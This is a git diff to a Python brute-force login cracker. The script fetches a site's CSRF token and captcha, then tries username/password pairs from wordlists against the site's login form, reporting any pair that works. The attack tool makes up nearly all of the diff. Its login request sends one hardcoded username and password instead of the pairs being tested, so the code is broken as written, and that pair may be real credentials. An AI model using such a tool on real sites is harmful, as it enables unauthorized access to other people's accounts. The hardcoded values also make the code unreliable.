@@ -5,13 +5,43 @@ from bs4 import BeautifulSoup
 
 
 def check_successfully(content):
-    return True
+    soup = BeautifulSoup(content, 'lxml')
+    warning = soup.body.find_all(attrs={'class': 'alert alert-warning'})
+    if "成功" in warning[0].text.split()[1]:
+        return True
+    return False
+
+
+def get_captcha(image_name):
+    code = input("code: ")
+    return code
+
+
+def crack(site, username, password):
+    s = requests.Session()
+    page_content = s.get(site).content  # 获得 Session
+    soup = BeautifulSoup(page_content, 'lxml')
+    csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']
+
+    # 获得验证码的值
+    image_data = s.get(site + 'get_captcha').content
+    image_name = 'image' + csrf + '.png'
+    with open(image_name, 'wb') as image_file:
+        image_file.write(image_data)
+    captcha_code = get_captcha(image_name)
+    os.remove(image_name)
+
+    response = s.post(site + 'login', data={'csrf_token': csrf, 'username': 'tianzhijiao1119', 'password': '690847721',
+                                            'captcha_code': captcha_code, 'submit': 'Login'})
+    if check_successfully(response.content.decode()):
+        return True, username, password
+    return False, username, password
 
 
 if __name__ == '__main__':
     usage = "Using cracker.py to break login by brute force."
     parser = OptionParser(usage)
-    parser.add_option('-h', '--host', dest="site", type="string")
+    parser.add_option('-s', '--site', dest="site", type="string")
     parser.add_option('-d', '--dict', dest="data_dict", type="string")
     parser.add_option('-u', '--user', dest="user_dict", type="string")
     parser.add_option('-p', '--pass', dest="pass_dict", type="string")
@@ -33,6 +63,9 @@ if __name__ == '__main__':
     if data_dict_path is None:
         user_dict_path = options.user_dict
         pass_dict_path = options.pass_dict
+        if user_dict_path is None or pass_dict_path is None:
+            print("You should specify target dict by -d or --dict\nOr you can specify user by -u and password by -p")
+            exit(-1)
         if not os.path.exists(user_dict_path) or not os.path.exists(pass_dict_path):
             print("File %s or %s not found." % (data_dict_path, pass_dict_path))
             exit(-1)
@@ -56,27 +89,13 @@ if __name__ == '__main__':
                     username_list.append(username)
                     password_list.append(password)
 
-    s = requests.Session()
-    page_content = s.get(site).content  # 获得 Session
-    soup = BeautifulSoup(page_content, 'lxml')
-    csrf = soup.body.find_all(attrs={'id': 'csrf_token'})[0].attrs['value']
-
     # 开始爆破
     for index in range(len(username_list)):
         username = username_list[index]
         password = password_list[index]
         if len(username) <= 1 or len(password) <= 1:
             continue
+        result, _, _ = crack(site, username, password)
+        if result:
+            print("Find correct username and password: %s - %s" % (username, password))
 
-        # 获得验证码的值
-        image_data = s.get(site + 'get_captcha').content
-        with open('image.png', 'wb') as image_file:
-            image_file.write(image_data)
-        captcha_code = input('Input code: ')
-
-        # 这里进行爆破
-        response = s.post(site + 'login', data={'csrf_token': csrf, 'username': 'tianzhijiao1119', 'password': '690847721',
-                                                'captcha_code': captcha_code, 'submit': 'Login'})
-        if check_successfully(response.content.decode()):
-            print('Successfully! Username: %s, Password: %s' % (username, password))
-            break
